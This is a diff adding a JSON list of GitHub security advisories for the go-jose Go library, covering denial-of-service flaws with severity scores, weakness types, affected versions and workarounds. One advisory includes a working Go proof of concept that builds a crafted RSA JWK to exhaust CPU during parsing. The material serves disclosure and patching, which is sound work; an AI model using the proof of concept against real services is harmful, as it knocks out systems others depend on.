+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+        "score": 6.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-129",
+        "name": "Improper Validation of Array Index"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-129"
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vvm8-gf78-28g4",
+    "cve_id": "CVE-2026-116586",
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-vvm8-gf78-28g4",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-vvm8-gf78-28g4",
+    "summary": "Crash when JSON parsing",
+    "description": "### Summary\r\n\r\nParsing deeply nested JSON structures can hit Go's stack limit, causing the application to crash.\r\n\r\nNote: this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.\r\n\r\n### Impact\r\n\r\nDenial of service vulnerability. Any application that parses untrusted JSON via go-jose is exposed.\r\n\r\n### Workarounds\r\n\r\nReject large inputs before parsing them.\r\n\r\n### Acknowledgements\r\n\r\nThanks to Dohyun Kim (@azza999), Joshua Rogers of AISLE Research, and Sueun Cho for alerting us to the need to patch this.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "inahga",
+      "id": 57697428,
+      "node_id": "MDQ6VXNlcjU3Njk3NDI4",
+      "avatar_url": "https://avatars.githubusercontent.com/u/57697428?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/inahga",
+      "html_url": "https://github.com/inahga",
+      "followers_url": "https://api.github.com/users/inahga/followers",
+      "following_url": "https://api.github.com/users/inahga/following{/other_user}",
+      "gists_url": "https://api.github.com/users/inahga/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/inahga/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/inahga/subscriptions",
+      "organizations_url": "https://api.github.com/users/inahga/orgs",
+      "repos_url": "https://api.github.com/users/inahga/repos",
+      "events_url": "https://api.github.com/users/inahga/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/inahga/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-vvm8-gf78-28g4",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-116586",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-26T21:08:28Z",
+    "published_at": "2026-10-19T19:08:33Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "< 4.1.5",
+        "patched_versions": "4.1.5",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "<= 3.0.5",
+        "patched_versions": "",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+        "score": 6.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-674",
+        "name": "Uncontrolled Recursion"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-674"
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mgcc-cww5-fp2q",
+    "cve_id": "CVE-2026-116587",
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-mgcc-cww5-fp2q",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-mgcc-cww5-fp2q",
+    "summary": "Denial of service when parsing JWKs that contain RSA keys",
+    "description": "### Summary\r\n\r\nA crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.\r\n\r\n### Details\r\n\r\ngo-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to `crypto/rsa.PrivateKey.Validate()`. On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.\r\n\r\nhttps://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700\r\n\r\n### Proof of concept\r\n\r\nNo special configuration of go-jose is required to reproduce this vulnerability.\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"encoding/base64\"\r\n\t\"encoding/json\"\r\n\t\"fmt\"\r\n\t\"math/big\"\r\n\t\"time\"\r\n\r\n\t\"github.com/go-jose/go-jose/v4\"\r\n)\r\n\r\nfunc main() {\r\n\t// The RSA parameters can be complete junk. The CPU cost is in validating them.\r\n\tprimeBits := 16384\r\n\tp := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))\r\n\tp.SetBit(p, 0, 1)\r\n\tn := new(big.Int).Lsh(big.NewInt(1), 2048)\r\n\te := big.NewInt(65537)\r\n\td := big.NewInt(3)\r\n\tq := big.NewInt(3)\r\n\r\n\tjwk := map[string]string{\r\n\t\t\"kty\": \"RSA\",\r\n\t\t\"n\":   base64.RawURLEncoding.EncodeToString(n.Bytes()),\r\n\t\t\"e\":   base64.RawURLEncoding.EncodeToString(e.Bytes()),\r\n\t\t\"d\":   base64.RawURLEncoding.EncodeToString(d.Bytes()),\r\n\t\t\"p\":   base64.RawURLEncoding.EncodeToString(p.Bytes()),\r\n\t\t\"q\":   base64.RawURLEncoding.EncodeToString(q.Bytes()),\r\n\t}\r\n\r\n\tprotected := map[string]any{\r\n\t\t\"alg\": \"RS256\",\r\n\t\t\"jwk\": jwk,\r\n\t}\r\n\tprotJSON, _ := json.Marshal(protected)\r\n\r\n\tjws := map[string]string{\r\n\t\t\"protected\": base64.RawURLEncoding.EncodeToString(protJSON),\r\n\t\t\"payload\":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),\r\n\t\t\"signature\": base64.RawURLEncoding.EncodeToString([]byte(\"not-a-real-signature\")),\r\n\t}\r\n\tjwsJSON, _ := json.Marshal(jws)\r\n\r\n\tstart := time.Now()\r\n\t_, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})\r\n\telapsed := time.Since(start)\r\n\r\n\tfmt.Printf(\"prime bits: %d\\n\", primeBits)\r\n\tfmt.Printf(\"parse time: %s\\n\", elapsed)\r\n\tfmt.Printf(\"parse error: %v\\n\", err)\r\n}\r\n```\r\n\r\n### Impact\r\n\r\nDenial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.\r\n\r\n### Credits\r\n\r\nReported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "inahga",
+      "id": 57697428,
+      "node_id": "MDQ6VXNlcjU3Njk3NDI4",
+      "avatar_url": "https://avatars.githubusercontent.com/u/57697428?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/inahga",
+      "html_url": "https://github.com/inahga",
+      "followers_url": "https://api.github.com/users/inahga/followers",
+      "following_url": "https://api.github.com/users/inahga/following{/other_user}",
+      "gists_url": "https://api.github.com/users/inahga/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/inahga/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/inahga/subscriptions",
+      "organizations_url": "https://api.github.com/users/inahga/orgs",
+      "repos_url": "https://api.github.com/users/inahga/repos",
+      "events_url": "https://api.github.com/users/inahga/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/inahga/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-mgcc-cww5-fp2q",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-116587",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-26T21:11:18Z",
+    "published_at": "2026-10-14T23:13:08Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "<= 4.1.5",
+        "patched_versions": "4.1.6",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "<= 3.0.5",
+        "patched_versions": "",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-407",
+        "name": "Inefficient Algorithmic Complexity"
+      },
+      {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-407",
+      "CWE-770"
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-6mp9-8xrw-74r4",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-6mp9-8xrw-74r4",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4",
+    "summary": "Panics in JSON parsing and CBC-HMAC processing",
+    "description": "### Impact\r\n\r\n - Parsing deeply nested JSON structures can hit Go's stack limit, causing a panic.\r\n - Decrypting a ciphertext with \"A128CBC-HS256\", \"A192CBC-HS384\", or \"A256CBC_HS512\" can result in a panic on untrusted input.\r\n\r\n### Patches\r\n\r\nPatched in v4.1.5.\r\n\r\n### Workarounds\r\n\r\n - Reject large inputs before parsing them.\r\n - If the application does not require the CBC-HMAC modes for content encryption, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.\r\n\r\n### References\r\n\r\nhttps://github.com/go-jose/go-jose/releases/tag/v4.1.5",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "jsha",
+      "id": 220205,
+      "node_id": "MDQ6VXNlcjIyMDIwNQ==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/220205?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jsha",
+      "html_url": "https://github.com/jsha",
+      "followers_url": "https://api.github.com/users/jsha/followers",
+      "following_url": "https://api.github.com/users/jsha/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jsha/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jsha/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jsha/subscriptions",
+      "organizations_url": "https://api.github.com/users/jsha/orgs",
+      "repos_url": "https://api.github.com/users/jsha/repos",
+      "events_url": "https://api.github.com/users/jsha/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jsha/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-6mp9-8xrw-74r4",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-09-04T04:49:17Z",
+    "published_at": "2026-09-04T04:49:17Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "< v4.1.5",
+        "patched_versions": "v4.1.4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-78h2-9frx-2jm8",
+    "cve_id": "CVE-2026-34986",
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-78h2-9frx-2jm8",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-78h2-9frx-2jm8",
+    "summary": "Panic in JWE decryption",
+    "description": "### Impact\r\n\r\nDecrypting a JSON Web Encryption (JWE) object will panic if the `alg` field indicates a key wrapping algorithm ([one ending in `KW`](https://pkg.go.dev/github.com/go-jose/go-jose/v4#pkg-constants), with the exception of `A128GCMKW`, `A192GCMKW`, and `A256GCMKW`) and the `encrypted_key` field is empty. The panic happens when `cipher.KeyUnwrap()` in `key_wrap.go` attempts to allocate a slice with a zero or negative length based on the length of the `encrypted_key`.\r\n\r\nThis code path is reachable from `ParseEncrypted()` / `ParseEncryptedJSON()` / `ParseEncryptedCompact()` followed by `Decrypt()` on the resulting object. Note that the parse functions take a list of accepted key algorithms. If the accepted key algorithms do not include any key wrapping algorithms, parsing will fail and the application will be unaffected.\r\n\r\nThis panic is also reachable by calling `cipher.KeyUnwrap()` directly with any `ciphertext` parameter less than 16 bytes long, but calling this function directly is less common.\r\n\r\nPanics can lead to denial of service.\r\n\r\n### Fixed In\r\n\r\n4.1.4 and v3.0.5\r\n\r\n### Workarounds\r\n\r\nIf the list of `keyAlgorithms` passed to `ParseEncrypted()` / `ParseEncryptedJSON()` / `ParseEncryptedCompact()` does not include key wrapping algorithms (those ending in `KW`), your application is unaffected.\r\n\r\nIf your application uses key wrapping, you can prevalidate to the JWE objects to ensure the `encrypted_key` field is nonempty. If your application accepts JWE Compact Serialization, apply that validation to the corresponding field of that serialization (the data between the first and second `.`).\r\n\r\n### Thanks\r\n\r\nThanks to Datadog's Security team for finding this issue.\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "jsha",
+      "id": 220205,
+      "node_id": "MDQ6VXNlcjIyMDIwNQ==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/220205?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jsha",
+      "html_url": "https://github.com/jsha",
+      "followers_url": "https://api.github.com/users/jsha/followers",
+      "following_url": "https://api.github.com/users/jsha/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jsha/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jsha/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jsha/subscriptions",
+      "organizations_url": "https://api.github.com/users/jsha/orgs",
+      "repos_url": "https://api.github.com/users/jsha/repos",
+      "events_url": "https://api.github.com/users/jsha/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jsha/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-78h2-9frx-2jm8",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-34986",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-31T23:54:13Z",
+    "published_at": "2026-03-31T23:54:13Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "< 4.1.4",
+        "patched_versions": "4.1.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "< 3.0.5",
+        "patched_versions": "3.0.5",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-c6gw-w398-hv78",
+    "cve_id": "CVE-2025-27144",
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-c6gw-w398-hv78",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-c6gw-w398-hv78",
+    "summary": "DoS in go-jose Parsing",
+    "description": "### Impact\r\nWhen parsing compact JWS or JWE input, go-jose could use excessive memory. The code used strings.Split(token, \".\") to split JWT tokens, which is vulnerable to excessive memory consumption when processing maliciously crafted tokens with a large number of '.' characters.  An attacker could exploit this by sending numerous malformed tokens, leading to memory exhaustion and a Denial of Service.\r\n\r\n### Patches\r\nVersion 4.0.5 fixes this issue\r\n\r\n### Workarounds\r\nApplications could pre-validate payloads passed to go-jose do not contain an excessive number of '.' characters.\r\n\r\n### References\r\nThis is the same sort of issue as in the golang.org/x/oauth2/jws package as CVE-2025-22868 and Go issue https://go.dev/issue/71490.\r\n",
+    "severity": "low",
+    "author": null,
+    "publisher": {
+      "login": "mcpherrinm",
+      "id": 47425,
+      "node_id": "MDQ6VXNlcjQ3NDI1",
+      "avatar_url": "https://avatars.githubusercontent.com/u/47425?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mcpherrinm",
+      "html_url": "https://github.com/mcpherrinm",
+      "followers_url": "https://api.github.com/users/mcpherrinm/followers",
+      "following_url": "https://api.github.com/users/mcpherrinm/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mcpherrinm/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mcpherrinm/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mcpherrinm/subscriptions",
+      "organizations_url": "https://api.github.com/users/mcpherrinm/orgs",
+      "repos_url": "https://api.github.com/users/mcpherrinm/repos",
+      "events_url": "https://api.github.com/users/mcpherrinm/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mcpherrinm/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-c6gw-w398-hv78",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-27144",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-02-24T20:47:55Z",
+    "published_at": "2025-02-24T20:38:00Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "< 4.0.5",
+        "patched_versions": "4.0.5",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "< 3.0.4",
+        "patched_versions": "3.0.4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+
+    ],
+    "credits_detailed": [
+
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-c5q2-7r4c-mv6g",
+    "cve_id": "CVE-2024-28180",
+    "url": "https://api.github.com/repos/go-jose/go-jose/security-advisories/GHSA-c5q2-7r4c-mv6g",
+    "html_url": "https://github.com/go-jose/go-jose/security/advisories/GHSA-c5q2-7r4c-mv6g",
+    "summary": "Improper Handling of Highly Compressed Data (Data Amplification) in github.com/go-jose/go-jose/v4",
+    "description": "### Impact\r\nAn attacker could send a JWE containing compressed data that used large amounts of memory and CPU when decompressed by Decrypt or DecryptMulti. Those functions now return an error if the decompressed data would exceed 250kB or 10x the compressed size (whichever is larger). Thanks to Enze Wang@Alioth and Jianjun Chen@Zhongguancun Lab (@zer0yu and @chenjj) for reporting.\r\n\r\n### Patches\r\nThe problem is fixed in v4.0.1, v3.0.3, v2.6.3\r\n\r\n",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "mcpherrinm",
+      "id": 47425,
+      "node_id": "MDQ6VXNlcjQ3NDI1",
+      "avatar_url": "https://avatars.githubusercontent.com/u/47425?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mcpherrinm",
+      "html_url": "https://github.com/mcpherrinm",
+      "followers_url": "https://api.github.com/users/mcpherrinm/followers",
+      "following_url": "https://api.github.com/users/mcpherrinm/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mcpherrinm/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mcpherrinm/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mcpherrinm/subscriptions",
+      "organizations_url": "https://api.github.com/users/mcpherrinm/orgs",
+      "repos_url": "https://api.github.com/users/mcpherrinm/repos",
+      "events_url": "https://api.github.com/users/mcpherrinm/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mcpherrinm/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-c5q2-7r4c-mv6g",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-28180",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-03-08T15:02:48Z",
+    "published_at": "2024-03-07T22:29:09Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v4"
+        },
+        "vulnerable_version_range": "< 4.0.1",
+        "patched_versions": "4.0.1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/go-jose/go-jose/v3"
+        },
+        "vulnerable_version_range": "< 3.0.3",
+        "patched_versions": "3.0.3",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "gopkg.in/go-jose/go-jose.v2"
+        },
+        "vulnerable_version_range": "< 2.6.3",
+        "patched_versions": "2.6.3",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L",
+        "score": 4.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-409",
+        "name": "Improper Handling of Highly Compressed Data (Data Amplification)"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-409"
+    ],
+    "credits": [
+      {
+        "login": "zer0yu",
+        "type": "reporter"
+      },
+      {
+        "login": "chenjj",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "zer0yu",
+          "id": 16551733,
+          "node_id": "MDQ6VXNlcjE2NTUxNzMz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/16551733?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/zer0yu",
+          "html_url": "https://github.com/zer0yu",
+          "followers_url": "https://api.github.com/users/zer0yu/followers",
+          "following_url": "https://api.github.com/users/zer0yu/following{/other_user}",
+          "gists_url": "https://api.github.com/users/zer0yu/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/zer0yu/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/zer0yu/subscriptions",
+          "organizations_url": "https://api.github.com/users/zer0yu/orgs",
+          "repos_url": "https://api.github.com/users/zer0yu/repos",
+          "events_url": "https://api.github.com/users/zer0yu/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/zer0yu/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "chenjj",
+          "id": 2682905,
+          "node_id": "MDQ6VXNlcjI2ODI5MDU=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2682905?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/chenjj",
+          "html_url": "https://github.com/chenjj",
+          "followers_url": "https://api.github.com/users/chenjj/followers",
+          "following_url": "https://api.github.com/users/chenjj/following{/other_user}",
+          "gists_url": "https://api.github.com/users/chenjj/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/chenjj/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/chenjj/subscriptions",
+          "organizations_url": "https://api.github.com/users/chenjj/orgs",
+          "repos_url": "https://api.github.com/users/chenjj/repos",
+          "events_url": "https://api.github.com/users/chenjj/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/chenjj/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L",
+      "score": 4.3
+    }
+  }
+]
